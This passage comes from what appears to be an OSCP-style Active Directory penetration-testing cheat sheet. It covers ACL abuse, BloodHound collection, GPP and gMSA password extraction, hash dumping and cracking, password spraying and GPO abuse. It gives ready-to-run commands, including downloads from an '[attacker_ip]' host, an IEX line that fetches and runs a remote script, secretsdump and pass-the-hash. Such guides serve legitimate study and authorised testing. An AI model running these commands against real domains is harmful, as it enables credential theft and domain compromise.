              <pre><code class="language-powershell">Get-ObjectAcl -Identity [username]
</code></pre>
              <ul>
                <li><strong>Convert Object SID to a name</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Convert-SidToName [SID]
</code></pre>
              <ul>
                <li><strong>Enumerate ACLs for a group</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-ObjectAcl -Identity &quot;[GroupName]&quot; | Where-Object { $_.ActiveDirectoryRights -eq &quot;GenericAll&quot; } | Select-Object SecurityIdentifier, ActiveDirectoryRights
</code></pre>
              <ul>
                <li><strong>Convert SIDs with GenericAll permission to names</strong>:</li>
              </ul>
              <pre><code class="language-powershell">&quot;[SID1]&quot;, &quot;[SID2]&quot; | Convert-SidToName
</code></pre>
              <ul>
                <li><strong>Add yourself to a domain group</strong>:</li>
              </ul>
              <pre><code class="language-bash">net group &quot;[GroupName]&quot; [username] /add /domain
</code></pre>
              <ul>
                <li><strong>Verify group membership</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-NetGroup &quot;[GroupName]&quot; | Select-Object member
</code></pre>
              <h3 id="126-domain-shares-enumeration">12.6 Domain Shares Enumeration</h3>
              <ul>
                <li><strong>Find domain shares (PowerView)</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Find-DomainShare
</code></pre>
              <ul>
                <li><strong>Decrypt GPP password using gpp-decrypt</strong>:</li>
              </ul>
              <pre><code class="language-bash">gpp-decrypt [encrypted_password]
</code></pre>
              <h3 id="127-bloodhound--sharphound">12.7 BloodHound &amp; SharpHound</h3>
              <p>BloodHound is a tool for Active Directory (AD) enumeration and privilege escalation, designed to help
                visualize AD relationships and identify paths for lateral movement and privilege escalation.</p>
              <p>Resources:</p>
              <ul>
                <li><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">SharpHound.ps1</a>
                </li>
                <li><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">SharpHound.exe</a>
                </li>
              </ul>
              <ol>
                <li><strong>Download and Transfer SharpHound</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># Download the PowerShell version of SharpHound
Invoke-WebRequest -Uri &quot;http://[attacker_ip]/sharphound.ps1&quot; -OutFile &quot;C:\Temp\sharphound.ps1&quot;

# Alternatively, you can download the .exe version
Invoke-WebRequest -Uri &quot;http://[attacker_ip]/sharphound.exe&quot; -OutFile &quot;C:\Temp\sharphound.exe&quot;
</code></pre>
              <ol start="2">
                <li><strong>Running SharpHound</strong></li>
                <ul>
                  <li>Find your <strong>Domain Name</strong>:</li>
                  <pre><code class="language-powershell"># Find your domain name
nltest /dclist:domainname
or
Get-ADDomainController -Discover

# Run SharpHound to collect domain data (using the .exe)
.\SharpHound.exe -c All
or
.\SharpHound.exe -c All -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; -f AllData</code></pre>
                  <li>Using the <strong>PowerShell Script</strong>:</li>
                  <pre><code class="language-powershell"># Import the SharpHound script into memory
Import-Module .\SharpHound.ps1

# Collect all data from the domain
Invoke-BloodHound -CollectionMethod All -Domain &lt;domain&gt; -OutputDirectory C:\Temp</code></pre>
                  <li>Collect <strong>Specific Methods</strong>: run only specific collection tasks instead
                    of <code>All</code> to limit the data gathered.</li>
                  <pre><code class="language-powershell">Invoke-BloodHound -CollectionMethod Group
Invoke-BloodHound -CollectionMethod ACL</code></pre>
                </ul>
              </ol>
              <ol start="3">
                <li><strong>Transfer Collected Data to Kali</strong>: once SharpHound finishes collecting, transfer the
                  output <code>.zip</code> file from <code>C:\Temp</code> back to your Kali machine. You can use one of
                  the methods below or check Section 15 for additional transfer methods.</li>
              </ol>
              <pre><code class="language-bash"># Having an Evil-WinRM session
download [bloodhound_file].zip

# SCP from the victim to your Kali
scp user@victim-ip:C:\Temp\*.zip /path/to/your/dir

# Download via a web server
Invoke-WebRequest -Uri &quot;http://your-kali-ip/upload/path&quot; -OutFile &quot;C:\Temp\*.zip&quot;
</code></pre>
              <ol start="4">
                <li><strong>Running BloodHound on Kali</strong>: access the Neo4j interface at
                  <code>https://localhost:7474</code> and log in with default credentials <code>neo4j:neo4j</code> or
                  <code>neo4j:Neo4j</code>.
                </li>
              </ol>
              <pre><code class="language-bash"># Start the Neo4j service in Kali (needed for analyzing the collected data):
sudo neo4j start
</code></pre>
              <ol start="5">
                <li><strong>Start BloodHound</strong>:</li>
              </ol>
              <pre><code class="language-bash">bloodhound
</code></pre>
              <ol start="6">
                <li>
                  <p><strong>Import the .zip files</strong> collected from the victim machine into BloodHound for
                    analysis.</p>
                </li>
                <li>
                  <p><strong>Analyze</strong> the domain data:</p>
                  <ul>
                    <li>Use queries like <em>Find all Domain Admins</em> or <em>Find Shortest Paths to Domain
                        Admins</em>.</li>
                    <li>Find computers vulnerable to <strong>Unconstrained Delegation</strong>.</li>
                    <li><strong>Mark nodes as owned</strong> to find potential escalation paths.</li>
                    <li>Set <strong>Node Label Display</strong> to <strong>Always Display</strong> in the settings for
                      better visibility.</li>
                    <li>Identify <strong>Kerberoastable accounts</strong>.</li>
                    <li>Find potential GPOs to abuse: if BloodHound indicates that a user or group has
                      <code>WriteGPO</code>, <code>OwnsGPO</code>, or <code>GPO control</code> over a GPO linked to
                      important OUs (especially those affecting privileged accounts), this is a strong indicator to use
                      SharpGPOAbuse to escalate privileges or perform lateral movement.
                    </li>
                  </ul>
                </li>
                <li>
                  <p><strong>Manual Commands</strong>:</p>
                  <ul>
                    <li>Format for cypher: <code>(NODES)-[:RELATIONSHIP]-&gt;(NODES)</code></li>
                    <li>All computers in domain: <code>MATCH (m:Computer) RETURN m</code></li>
                    <li>All Users in domain: <code>MATCH (m:User) RETURN m</code></li>
                    <li>Get active sessions: <code>MATCH p = (c:Computer)-[:HasSession]-&gt;(m:User) RETURN p</code>
                    </li>
                    <li>Enumerate users with <code>SQLAdmin</code>:
                      <code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2</code>
                    </li>
                    <li>Enumerate users with <code>CanPSRemote</code>:
                      <code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2</code>
                    </li>
                  </ul>
                </li>
              </ol>
              <h3 id="128-extracting-and-cracking-password-hashes">12.8 Extracting and Cracking Password Hashes</h3>
              <ol>
                <li><strong>Dump Hashes with SecretsDump</strong>: use <strong>SecretsDump</strong> to extract NTDS.dit
                  or password hashes.</li>
              </ol>
              <pre><code class="language-bash">secretsdump.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;dc-ip&gt;
</code></pre>
              <ol start="2">
                <li><strong>Crack NTLM Hashes</strong>: once you have the hashes, crack them with
                  <strong>Hashcat</strong> or <strong>John the Ripper.</strong>
                </li>
              </ol>
              <pre><code class="language-bash">hashcat -m 1000 ntlm-hashes.txt rockyou.txt
</code></pre>
              <ol start="3">
                <li><strong>Password Spraying</strong>: involves testing common passwords across many accounts to avoid
                  account lockouts. CrackMapExec is ideal for this.</li>
              </ol>
              <pre><code class="language-bash"># Many more commands can be found in the Section 6.
crackmapexec smb &lt;dc-ip&gt; -u usernames.txt -p password123 --spray
</code></pre>
              <h3 id="129-ms-rprn-print-spooler-service-exploitation">12.9 MS-RPRN Print Spooler Service Exploitation
              </h3>
              <p>The <strong>Print Spooler service</strong> has been linked to critical vulnerabilities,
                notably <strong>CVE-2021-34527</strong> (PrintNightmare). This vulnerability allows attackers to execute
                arbitrary code remotely with SYSTEM privileges due to improper handling of requests.</p>
              <p><strong>Enumerate Printers</strong>: if Print Spooler service is enabled, enumerate available printers.
              </p>
              <pre><code class="language-bash">rpcclient -U &quot;&lt;user&gt;%&lt;password&gt;&quot; &lt;dc-ip&gt; --command=&quot;enumprinters&quot;
</code></pre>
              <h3 id="1210-common-spns-for-service-accounts">12.10 Common SPNs for Service Accounts</h3>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>SPN</th>
                    <th>Name</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><code>cifs</code></td>
                    <td>Common Internet File System</td>
                  </tr>
                  <tr>
                    <td><code>dcom</code></td>
                    <td>Distributed Component Object Model</td>
                  </tr>
                  <tr>
                    <td><code>exchange</code></td>
                    <td>Microsoft Exchange Server</td>
                  </tr>
                  <tr>
                    <td><code>ftp</code></td>
                    <td>File Transfer Protocol</td>
                  </tr>
                  <tr>
                    <td><code>http</code></td>
                    <td>Hypertext Transfer Protocol</td>
                  </tr>
                  <tr>
                    <td><code>imap</code></td>
                    <td>Internet Message Access Protocol</td>
                  </tr>
                  <tr>
                    <td><code>krbtgt</code></td>
                    <td>Kerberos Ticket Granting Ticket</td>
                  </tr>
                  <tr>
                    <td><code>ldap</code></td>
                    <td>Lightweight Directory Access Protocol</td>
                  </tr>
                  <tr>
                    <td><code>mssql</code></td>
                    <td>Microsoft SQL Server</td>
                  </tr>
                  <tr>
                    <td><code>mysql</code></td>
                    <td>MySQL Database</td>
                  </tr>
                  <tr>
                    <td><code>nfs</code></td>
                    <td>Network File System</td>
                  </tr>
                  <tr>
                    <td><code>oracle</code></td>
                    <td>Oracle Database</td>
                  </tr>
                  <tr>
                    <td><code>pgsq</code></td>
                    <td>PostgreSQL Database</td>
                  </tr>
                  <tr>
                    <td><code>pop3</code></td>
                    <td>Post Office Protocol 3</td>
                  </tr>
                  <tr>
                    <td><code>rpc</code></td>
                    <td>Remote Procedure Call</td>
                  </tr>
                  <tr>
                    <td><code>smtp</code></td>
                    <td>Simple Mail Transfer Protocol</td>
                  </tr>
                  <tr>
                    <td><code>svc</code></td>
                    <td>Service</td>
                  </tr>
                  <tr>
                    <td><code>termsrv</code></td>
                    <td>Terminal Server</td>
                  </tr>
                  <tr>
                    <td><code>wsman</code></td>
                    <td>Windows Remote Management</td>
                  </tr>
                </tbody>
              </table>
              <h3 id="1211-gpp-passwords-abuse-group-policy-preferences">12.11 GPP Passwords Abuse (Group Policy
                Preferences)</h3>
              <h4 id="12111-gpp-main-method-for-extraction">12.11.1 GPP Main Method for Extraction</h4>
              <p><strong>Search for GPP Passwords in SYSVOL</strong>: access SYSVOL share and search for Group Policy
                Preferences (GPP) files; this happens because a common useful misconfiguration found in modern domain
                environments is unprotected Windows GPP settings files</p>
              <ol>
                <li><strong>Map the DC SYSVOL</strong> share:</li>
              </ol>
              <pre><code class="language-powershell">net use z:\\[hostname/domain]\SYSVOL
</code></pre>
              <ol start="2">
                <li><strong>Find the GPP file</strong>: usually the one called <code>Groups.xml</code>: the file is
                  usually located in a path similar to this one
                  <code>\hostname.domain\Policies\{00000000-0000-0000-0000-00000000000}\MACHINE\Preferences\Groups\Groups.xml</code>.
                </li>
              </ol>
              <pre><code class="language-powershell">dir /s Groups.xml

type Groups.xml
</code></pre>
              <ol start="3">
                <li><strong>Decrypt the Found <code>Hash</code> / <code>cpassword</code></strong>:</li>
              </ol>
              <pre><code class="language-bash">gpp-decrypt [gpp_hash/cpassword]

# Example
gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
sup3r53cr3tGP0pa55
</code></pre>
              <ol start="4">
                <li><strong>(Optional) Alternative Method</strong>:</li>
              </ol>
              <pre><code class="language-bash"># Check for cpassword in the SYSvol share to obtain cleartext passwords in XML files.
dir \\\\&lt;domain&gt;\\SYSVOL\\&lt;domain&gt;\\Policies\\ /s /b | findstr cpassword

# Look for Groups.xml files which might contain cleartext passwords.
smbclient //dc-ip/SYSVOL -U &quot;domain\username&quot;
</code></pre>
              <h4 id="12112-impacket-get-gpppassword">12.11.2 Impacket-Get-GPPPassword</h4>
              <p><code>Impacket-Get-GPPPassword</code> (<code>Get-GPPPassword.py</code>) is an Impacket script for
                retrieving GPP passwords. There are several methods for using this script depending on the level of
                access you have:</p>
              <ul>
                <li><strong>NULL Session</strong>: this command attempts to retrieve GPP passwords without providing any
                  credentials (NULL session). Useful if anonymous access is allowed on the target Domain Controller
                  (DC).</li>
              </ul>
              <pre><code class="language-bash">Get-GPPPassword.py -no-pass &#39;[DOMAIN_CONTROLLER]&#39;
</code></pre>
              <ul>
                <li><strong>With Cleartext Credentials</strong>: uses cleartext credentials (username and password) to
                  access and retrieve stored GPP passwords from the DC.</li>
              </ul>
              <pre><code class="language-bash">Get-GPPPassword.py &#39;[DOMAIN]&#39;/&#39;[USER]&#39;:&#39;[PASSWORD]&#39;@&#39;[DOMAIN_CONTROLLER]&#39;
</code></pre>
              <ul>
                <li><strong>Pass-the-Hash (with NT hash)</strong>: executes a pass-the-hash attack with the user&rsquo;s
                  NTLM
                  hash instead of a password, allowing retrieval of GPP passwords.</li>
              </ul>
              <pre><code class="language-bash">Get-GPPPassword.py -hashes :&#39;[NThash]&#39; &#39;[DOMAIN]&#39;/&#39;[USER]&#39;:&#39;[PASSWORD]&#39;@&#39;[DOMAIN_CONTROLLER]&#39;
</code></pre>
              <ul>
                <li><strong>Parsing a Local File</strong>: this command parses a local Policy XML file for stored
                  passwords. Useful if you have a downloaded or extracted policy file on your machine.</li>
              </ul>
              <pre><code class="language-bash">Get-GPPPassword.py -xmlfile &#39;/path/to/Policy.xml&#39; &#39;LOCAL&#39;
</code></pre>
              <h4 id="12113-smb-share-sysvol">12.11.3 SMB Share-SYSVOL</h4>
              <p>SYSVOL is a shared folder on the DC where Group Policy objects (GPOs) and scripts are stored. This
                folder is often accessible to any domain user, allowing attackers to potentially access configuration
                files with stored passwords (GPP).</p>
              <ol>
                <li><strong>Download the Entire Share</strong>: you can use a tool or script to download the entire
                  SYSVOL share for offline analysis.</li>
              </ol>
              <pre><code class="language-bash"># Reference to a script for downloading files in SYSVOL
https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
</code></pre>
              <ol start="2">
                <li><strong>Navigate to Downloaded Files</strong>: this command searches through the downloaded files
                  for instances of <code>cpassword</code> (encrypted passwords stored in the XML files), helping
                  identify where passwords are stored.</li>
              </ol>
              <pre><code class="language-bash">grep -inr &quot;cpassword&quot;
</code></pre>
              <h4 id="12114-crackmapexec">12.11.4 CrackMapExec</h4>
              <p>CrackMapExec is a popular tool for SMB enumeration and exploitation. Here, it is used to locate GPP
                passwords.</p>
              <ul>
                <li><strong>With Username and Password</strong>: this command scans one or multiple targets to identify
                  stored GPP passwords using cleartext credentials.</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb &lt;TARGET[s]&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; -M gpp_password
</code></pre>
              <ul>
                <li><strong>With NTLM Hash</strong>: this variant allows pass-the-hash authentication with NT and LM
                  hashes instead of a password.</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb &lt;TARGET[s]&gt; -u &lt;USERNAME&gt; -H LMHash:NTLMHash -d &lt;DOMAIN&gt; -M gpp_password
</code></pre>

              <h3 id="1212-scripts-adpeas">12.12 Scripts (adPEAS)</h3>
              <h4 id="12121-importing-the-module">12.12.1 Importing the Module</h4>
              <p>Download from <a
                  href="https://github.com/61106960/adPEAS?tab=readme-ov-file#important-note-about-the-bloodhound-module">https://github.com/61106960/adPEAS?tab=readme-ov-file#important-note-about-the-bloodhound-module</a>.
              </p>
              <pre><code class="language-powershell">powershell -ExecutionPolicy Bypass

# Use any of the following options
Import-Module .\adPEAS.ps1

. .\adPEAS.ps1

gc -raw .\adPEAS.ps1 | iex

IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1&#39;)
</code></pre>
              <h4 id="12122-basic-usage">12.12.2 Basic Usage</h4>
              <ul>
                <li><strong>Enumerate Current Domain</strong>: start adPEAS and enumerate the domain for the logged-on
                  user and computer.</li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS
</code></pre>
              <ul>
                <li><strong>Specify Domain and Output</strong>: to specify a domain and save output without ANSI color
                  codes.</li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Domain &#39;[domain].com&#39; -Outputfile &#39;C:\temp\adPEAS_outputfile&#39; -NoColor
</code></pre>
              <ul>
                <li><strong>Specify Domain Controller</strong>: to enumerate using a specific domain controller.</li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Domain &#39;[domain].com&#39; -Server &#39;dc1.[domain].com&#39;
</code></pre>
              <ul>
                <li><strong>Using PSCredential</strong>: to use a PSCredential object for enumeration.</li>
              </ul>
              <pre><code class="language-powershell">$SecPassword = ConvertTo-SecureString &#39;[password]&#39; -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(&#39;[domain]\[userName]&#39;, $SecPassword)
Invoke-adPEAS -Domain &#39;[domain].com&#39; -Cred $Cred
</code></pre>
              <ul>
                <li><strong>Force Enumeration with Username and Password</strong>: to specify username and password for
                  enumeration while ignoring DNS issues.</li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Domain &#39;[domain].com&#39; -Server &#39;dc1.[domain].com&#39; -Username &#39;[domain]\[userName]&#39; -Password &#39;[password]&#39; -Force
</code></pre>
              <h4 id="12123-module-specific-usage">12.12.3 Module-Specific Usage</h4>
              <ul>
                <li><strong>Basic Active Directory Information</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Domain
</code></pre>
              <ul>
                <li><strong>Active Directory Rights and Permissions</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Rights
</code></pre>
              <ul>
                <li><strong>Group Policy Information</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module GPO
</code></pre>
              <ul>
                <li><strong>Active Directory Certificate Services Information</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module ADCS
</code></pre>
              <ul>
                <li><strong>Credential Exposure Issues</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Creds
</code></pre>
              <ul>
                <li><strong>Delegation Issues</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Delegation
</code></pre>
              <ul>
                <li><strong>High Privileged Groups Enumeration</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Accounts
</code></pre>
              <ul>
                <li><strong>Domain Controller and Service Enumeration</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Computer
</code></pre>
              <ul>
                <li><strong>BloodHound Enumeration (DCOnly)</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Bloodhound
</code></pre>
              <ul>
                <li><strong>BloodHound Enumeration (All)</strong></li>
              </ul>
              <pre><code class="language-powershell">Invoke-adPEAS -Module Bloodhound -Scope All
</code></pre>
              <h3 id="1213-group-managed-service-accounts-gmsas-abuse">12.13 Group Managed Service Accounts (gMSAs)
                Abuse</h3>
              <h4 id="12131-identifying-group-managed-service-accounts-gmsas">12.13.1 Identifying Group Managed Service
                Accounts (gMSAs)</h4>
              <h5 id="121311-manual-discovery-of-gmsas">12.13.1.1 Manual Discovery of gMSAs</h5>
              <p>You can manually search for gMSA accounts in Active Directory using PowerShell or LDAP queries.</p>
              <p><strong>Using PowerShell</strong>
                PowerShell&rsquo;s <code>Get-ADServiceAccount</code> cmdlet can help identify gMSA accounts, assuming
                you have sufficient permissions. This command lists all gMSAs in the domain with their properties,
                including <code>msDS-ManagedPassword</code>, if you have permissions to view it.</p>
              <pre><code class="language-powershell">Get-ADServiceAccount -Filter {ObjectClass -eq &quot;msDS-GroupManagedServiceAccount&quot;} -Properties *
</code></pre>
              <p><strong>Using LDAP Query</strong>
                You can also search for gMSAs directly by filtering based on their object class. This approach is useful
                if you don&rsquo;t have access to <code>Get-ADServiceAccount</code> but can execute LDAP queries. You
                can inspect the properties of each returned object for further information, like the account&#39;s
                service name.</p>
              <pre><code class="language-powershell">Get-ADObject -LDAPFilter &quot;(objectClass=msDS-GroupManagedServiceAccount)&quot; -Properties *
</code></pre>
              <p><strong>Identify Accessible gMSA Passwords</strong>: Once gMSAs are identified, check if you can read
                the <code>msDS-ManagedPassword</code> attribute. This attribute contains the encrypted password and is
                often readable by specific privileged accounts or groups.</p>
              <h5 id="121312-automated-discovery-with-bloodhound">12.13.1.2 Automated Discovery with BloodHound
              </h5>
              <p>BloodHound can map out relationships and permissions in Active Directory, making it ideal for
                identifying exploitable accounts, including gMSAs.</p>
              <ol>
                <li><strong>Run BloodHound Collection</strong>: use BloodHound&rsquo;s <code>SharpHound</code> collector
                  to gather data from the domain.</li>
              </ol>
              <pre><code class="language-powershell">SharpHound.exe -c All
</code></pre>
              <ol start="2">
                <li>
                  <p><strong>Analyze in BloodHound GUI</strong>: open the BloodHound GUI, upload the collected data, and
                    search for accounts with privileges to read gMSA passwords:</p>
                  <ul>
                    <li>Use the <strong>&quot;Find Principals with DCSync Rights&quot;</strong> query, which might help
                      indirectly as gMSA permissions are often linked to elevated roles.</li>
                    <li>Search for any objects where specific user groups have <code>ReadProperty</code> rights on the
                      <code>msDS-ManagedPassword</code> attribute.
                    </li>
                  </ul>
                </li>
                <li>
                  <p>(Optional) <strong>Query Examples in BloodHound</strong>:</p>
                  <ul>
                    <li>Use the query <code>Find Principals with Unusual Rights on Password Attributes</code>, as this
                      often includes gMSA password attributes.</li>
                    <li>BloodHound may highlight gMSA accounts that are configured with permissions for non-admin users
                      or groups, indicating potential targets for exploitation.</li>
                  </ul>
                </li>
              </ol>
              <h4 id="12132-gmsa-password-retrieval-with-gmsapasswordreader">12.13.2 GMSA Password Retrieval
                with GMSAPasswordReader</h4>
              <p><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank"><code>GMSAPasswordReader.exe</code></a>
                can
                be used to retrieve the plaintext password for Group Managed Service Accounts (gMSAs). This tool
                requires specific permissions, usually access to read the <code>msDS-ManagedPassword</code> attribute of
                the gMSA object.</p>
              <h5 id="121321-usage">12.13.2.1 Usage</h5>
              <ol>
                <li>
                  <p><strong>Run <code>GMSAPasswordReader.exe</code> with Proper Privileges</strong>: ensure you have
                    sufficient permissions to read gMSA password attributes in Active Directory. Typically, Domain Admin
                    or specific permissions on the gMSA object are required.</p>
                </li>
                <li>
                  <p><strong>Command Syntax</strong>: the tool can be run from the command line to retrieve gMSA
                    passwords.</p>
                </li>
              </ol>
              <pre><code class="language-powershell">.\GMSAPasswordReader.exe --AccountName [GMSA_ACCOUNT_NAME]

# Example
.\GMSAPasswordReader.exe --accountname &#39;svc_apache&#39;
# This will return probably an rc4_hmac (not the Old Value), which is the same as an NTLM hash, so we can try to crack it (hashcat -m 1000 &#39;[ntlm_hash]&#39; [wordlist]) or do a pass the hash, don&#39;t forget the &#39;$&#39; for the username if it is a service account (evil-winrm -i [ip] -u svc_apache$ -H [ntlm_hash]).
</code></pre>
              <h5 id="121322-additional-notes">12.13.2.2 Additional Notes</h5>
              <ul>
                <li><strong>Permissions</strong>: Ensure that you have necessary read permissions on the
                  <code>msDS-ManagedPassword</code> attribute.
                </li>
                <li><strong>Privileged Access</strong>: Typically, this tool is most useful on systems where you already
                  have Domain Admin or specific delegated permissions on gMSA objects.</li>
                <li><strong>Security Considerations</strong>: Use this tool carefully, as improper handling of retrieved
                  passwords can expose sensitive credentials.</li>
              </ul>
              <h4 id="12133-alternative-commands">12.13.3 Alternative Commands</h4>
              <p>If you don&rsquo;t have access to <code>GMSAPasswordReader.exe</code>, you might consider using
                PowerShell or other Active Directory enumeration techniques if you have appropriate permissions to query
                gMSA accounts and their attributes.</p>
              <ol>
                <li><strong>Using PowerShell</strong> with Active Directory Module: if you have the <strong>Active
                    Directory PowerShell module</strong> installed, you can use it to query for gMSAs and their
                  <code>msDS-ManagedPassword</code> attribute. This command lists all gMSAs and attempts to retrieve
                  their <code>msDS-ManagedPassword</code> attribute. You need permissions to read this attribute.
                </li>
              </ol>
              <pre><code class="language-powershell"># Find all gMSA accounts
Get-ADServiceAccount -Filter {ObjectClass -eq &quot;msDS-GroupManagedServiceAccount&quot;} -Properties msDS-ManagedPassword
</code></pre>
              <ol start="2">
                <li><strong>Using <code>Get-ADObject</code></strong> to Directly Query LDAP Attributes: if
                  <code>Get-ADServiceAccount</code> isn&rsquo;t available, <code>Get-ADObject</code> can directly query
                  Active Directory for objects with <code>msDS-ManagedPassword</code>. This command retrieves all gMSA
                  objects, showing their attributes, including the managed password (if accessible).
                </li>
              </ol>
              <pre><code class="language-powershell">Get-ADObject -Filter &#39;ObjectClass -eq &quot;msDS-GroupManagedServiceAccount&quot;&#39; -Properties msDS-ManagedPassword
</code></pre>
              <ol start="3">
                <li>
                  <p>Retrieving gMSA Passwords with <strong><code>Get-ADAttributeEditor</code></strong>: if you have
                    permissions and access to the Active Directory UI on a Windows machine; if you have read
                    permissions, you should be able to view or export the password attribute here.</p>
                  <ol>
                    <li>Open the <strong>Active Directory Users and Computers</strong> console.</li>
                    <li>Enable <strong>Advanced Features</strong> (under <em>View</em>).</li>
                    <li>Locate the gMSA account, right-click, and select <strong>Properties</strong>.</li>
                    <li>Navigate to the <strong>Attribute Editor</strong> tab and search for
                      <code>msDS-ManagedPassword</code>.
                    </li>
                  </ol>
                </li>
                <li>
                  <p>Using LDAP Queries with <strong><code>ldapsearch</code> (Linux)</strong>: if you&rsquo;re on a
                    Linux system with <strong>ldapsearch</strong> installed, you can use it to query Active Directory
                    for gMSA accounts. This approach requires credentials with LDAP access. This command fetches gMSA
                    objects and tries to access the <code>msDS-ManagedPassword</code> attribute.</p>
                </li>
              </ol>
              <pre><code class="language-bash">ldapsearch -x -H ldap://&lt;domain_controller&gt; -D &quot;&lt;user&gt;@&lt;domain&gt;&quot; -w &quot;&lt;password&gt;&quot; -b &quot;DC=domain,DC=com&quot; &quot;(objectClass=msDS-GroupManagedServiceAccount)&quot; msDS-ManagedPassword
</code></pre>
              <ol start="5">
                <li><strong>PowerView</strong>: if you&rsquo;re using PowerView, an enumeration tool in PowerShell
                  Empire, you can search for gMSA accounts and attempt to view password attributes; PowerView&rsquo;s
                  <code>Get-DomainGMSA</code> command can enumerate gMSA accounts and potentially view
                  <code>msDS-ManagedPassword</code> if you have the necessary permissions.
                </li>
              </ol>
              <pre><code class="language-powershell"># List gMSA accounts with PowerView
Get-DomainGMSA -Properties msDS-ManagedPassword
</code></pre>
              <h3 id="1214-group-policy-object-gpo-abuse">12.14 Group Policy Object (GPO) Abuse</h3>
              <p>Group Policy Objects (GPOs) allow administrators to enforce policies and configurations across all
                domain-connected machines. By modifying a GPO with malicious commands, attackers can achieve privilege
                escalation or persistence. The effectiveness of this attack lies in the fact that when GPOs are
                updated‚Äîeither manually or during regular system updates‚Äîthese policies are executed on all systems
                within their scope, including those used by privileged users like administrators. This means that any
                added malicious task or script will be run with the permissions of all users in that scope, enabling an
                attacker to execute code as an administrator without direct admin rights.</p>
              <p>Guides:</p>
              <ul>
                <li><a
                    href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview#group-policy-object-gpos"
                    target="_blank">Hacktricks
                    GPO Guide</a></li>
                <li><a
                    href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-group-policy-objects/"
                    target="_blank">InternalAllTheThings
                    Advanced Guide</a></li>
              </ul>
              <p>Resources:</p>
              <ul>
                <li><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">Download PowerView.ps1</a></li>
                <li><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">Download SharpGPOAbuse.exe</a>
                </li>
                <li><a href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank">SharpGPOAbuse GitHub</a></li>
              </ul>
              <ol>
                <li><strong>Import PowerView</strong></li>
              </ol>
              <pre><code class="language-powershell">powershell -ExecutionPolicy bypass
Import-Module ./PowerView.ps1
</code></pre>
              <ol start="2">
                <li><strong>List All GPOs</strong>: use PowerView to list all GPOs and check if there are write
                  permissions for any.<ul>
                    <li><strong>Basic GPO Listing</strong></li>
                  </ul>
                </li>
              </ol>
              <pre><code class="language-powershell">Get-NetGPO | select displayname
</code></pre>
              <ul>
                <li><strong>Manual Permission Check</strong>: this checks if you have any write permissions on GPOs,
                  which could allow for privilege escalation.</li>
              </ul>
              <pre><code class="language-powershell">Get-DomainObjectAcl -LDAPFilter &#39;(objectCategory=groupPolicyContainer)&#39; | ? { ($_.SecurityIdentifier -match &#39;^S-1-5-.*-[1-9]\d{3,}$&#39;) -and ($_.ActiveDirectoryRights -match &#39;WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner&#39;)} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
</code></pre>
              <ul>
                <li><strong>BloodHound Alternative</strong>: use BloodHound to check for <code>WriteGPO</code>,
                  <code>OwnsGPO</code>, or <code>GPO control</code> privileges, as they indicate possible GPO
                  manipulation for escalation.
                </li>
              </ul>
              <ol start="3">
                <li><strong>Enumerate a Specific GPO</strong>
                  <ul>
                    <li><strong>Identify GPO by Display Name</strong></li>
                  </ul>
                </li>
              </ol>
              <pre><code class="language-powershell">Get-GPO -Name &quot;[DisplayName]&quot;
</code></pre>
              <ul>
                <li><strong>Convert GPO ID to Name</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-GPO -Guid [gpo_id]
</code></pre>
              <ol start="4">
                <li><strong>Check Permissions on Specific GPO</strong>: verify if you have edit permissions or ownership
                  on a particular GPO.</li>
              </ol>
              <pre><code class="language-powershell">Get-GPPermission -Guid [gpo_id] -TargetType User -TargetName [user]
</code></pre>
              <ol start="5">
                <li><strong>Execute the Attack (If Permissions Allow)</strong>: se <code>SharpGPOAbuse</code> to
                  manipulate GPOs.<ul>
